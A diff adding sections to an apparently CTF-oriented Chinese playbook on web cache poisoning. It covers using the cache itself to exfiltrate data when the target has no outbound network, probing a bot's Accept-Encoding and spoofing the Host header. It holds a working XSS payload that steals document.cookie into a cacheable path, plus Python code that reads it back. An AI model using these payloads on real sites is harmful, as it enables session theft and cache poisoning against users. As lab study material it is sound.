@@ -181,3 +181,119 @@ isRSCRequest = headers['rsc'] !== undefined  // 空字符串 → true
 | 统一请求头检查逻辑 | 消除同一框架内不同模块的判断差异 |
 | Vary 头自动管理 | 框架自动设置正确的 Vary 头 |
 | 缓存控制头 | `Cache-Control: private` / `no-store` 防止缓存 |
+
+---
+
+## 6. 缓存中缓存数据渗出
+
+> 当目标环境无外网（Docker 隔离）时，XSS 无法将数据发送到外部服务器。解法是利用缓存本身作为数据传递通道。
+
+### 6.1 原理
+
+XSS 代码不把数据发到外部，而是发到目标网站的另一个可缓存路径，让数据被缓存。攻击者再从外部读取该缓存。
+
+```
+第一阶段：攻击者投毒缓存（注入 XSS 到 /_next/attack-path）
+第二阶段：XSS 在受害者浏览器中执行，将 Cookie/数据通过请求头发送到 /_next/exfil-path
+          → 数据出现在 /_next/exfil-path 的响应中 → 被缓存
+第三阶段：攻击者请求 /_next/exfil-path → 命中缓存 → 读取数据
+```
+
+### 6.2 XSS payload 模式
+
+```javascript
+// XSS 代码：读取 Cookie，写入另一个缓存路径
+var c = document.cookie;
+fetch('/_next/exfil', {
+  headers: {
+    'Content-Type': 'text/html',   // 触发 CT 覆盖（如果 middleware 支持）
+    'RSC': '',                      // 触发 RSC 渲染（如果需要）
+    'x-nonce': 'STOLEN:' + c       // 数据作为请求头值，反射到响应中
+  }
+}).catch(function(){});
+```
+
+### 6.3 适用条件
+
+| 条件 | 说明 |
+|------|------|
+| 目标无外网 | Docker 隔离或网络管控 |
+| 有可缓存的路径 | nginx 配置了 `proxy_cache` 的路径 |
+| 反射点存在 | 请求数据会出现在响应中（如 nonce 反射） |
+| 缓存键可控 | 攻击者能构造与 Bot 相同的缓存键 |
+
+### 6.4 攻击者读取数据
+
+```python
+# 第三阶段：读取渗出数据
+r = request('GET', '/_next/exfil', {
+    'Host': 'proxy:4000',              # 匹配内部缓存键
+    'Accept-Encoding': 'gzip, deflate' # 匹配 Bot 的 AE
+})
+if 'STOLEN:' in r['body']:
+    flag = r['body'][r['body'].find('STOLEN:'):]
+    print(f'FLAG: {flag}')
+```
+
+### 6.5 现实意义
+
+| 场景 | 适用性 |
+|------|-------|
+| 受害者网络有管控（只能访问内网） | 适用 |
+| 攻击者域名被封锁 | 适用 |
+| 不想留下外部服务器痕迹 | 适用 |
+| 受害者有外网访问 | 不需要（直接 webhook 外泄更简单） |
+
+---
+
+## 7. Bot 浏览器请求头探测
+
+### 7.1 AE（Accept-Encoding）探测
+
+**问题**：投毒时带的 AE 必须和 Bot 浏览器的 AE 精确匹配（Vary: Accept-Encoding）。
+
+**探测方法**：利用缓存命中状态反推。
+
+```
+步骤 1：选一个没被访问过的新路径（确保缓存为空）
+步骤 2：让 Bot 访问该路径（创建以 Bot AE 为二级键的缓存）
+步骤 3：攻击者用不同 AE 值读取该路径
+        → X-Proxy-Cache: HIT 的那个 AE 就是 Bot 的 AE
+```
+
+**脚本**（详见 `$AGENT_DIR/scripts/cache_poison.py` 的 `probe_accept_encoding` 函数）：
+
+```python
+ae_candidates = [
+    'gzip, deflate, br',
+    'gzip, deflate',
+    'gzip',
+    'gzip, br',
+    'deflate',
+    'identity',
+]
+
+for ae in ae_candidates:
+    r = request('GET', probe_path, {'Accept-Encoding': ae})
+    if r['cache'] == 'HIT':
+        print(f'Bot AE: {ae}')
+        break
+```
+
+**注意**：Docker 中使用系统包版 Chromium（非 Google Chrome）通常不支持 Brotli，AE 不含 `br`。
+
+### 7.2 Host 头对齐
+
+**问题**：攻击者从外网访问（Host: 外网IP），Bot 从内网访问（Host: 内部服务名），缓存主键不同。
+
+**解决**：投毒时手动设置 `Host` 为 Bot 使用的内部域名。
+
+```python
+conn.request('GET', '/_next/attack', headers={
+    'Host': 'proxy:4000',          # 伪造为内部域名
+    'Accept-Encoding': bot_ae,     # 匹配 Bot 的 AE
+    # ... 其他头
+})
+```
+
+**注意**：浏览器的 Fetch API 禁止修改 `Host` 头，必须用 Python/curl 等工具。
